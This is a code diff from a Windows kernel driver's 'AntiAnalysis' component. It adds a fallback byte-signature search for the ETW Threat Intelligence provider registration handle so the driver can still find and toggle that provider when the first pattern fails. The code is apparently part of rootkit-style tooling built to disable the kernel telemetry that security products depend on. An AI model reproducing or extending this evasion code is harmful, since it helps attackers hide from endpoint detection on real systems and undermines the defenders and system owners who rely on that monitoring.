@@ -67,8 +67,15 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 			searchedRoutineAddress, targetFunctionDistance,
 			&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
-		if (!searchedRoutineOffset)
-			return STATUS_NOT_FOUND;
+		if (!searchedRoutineOffset) {
+			searchedRoutineOffset = (PLONG)FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature3,
+				0xCC, etwThreatIntProvRegHandleSigLen - 1,
+				searchedRoutineAddress, targetFunctionDistance,
+				&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+
+			if (!searchedRoutineOffset)
+				return STATUS_NOT_FOUND;
+		}
 	}
 	PUCHAR etwThreatIntProvRegHandle = (PUCHAR)searchedRoutineAddress + (*searchedRoutineOffset) + foundIndex + EtwThreatIntProvRegHandleOffset;
 	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
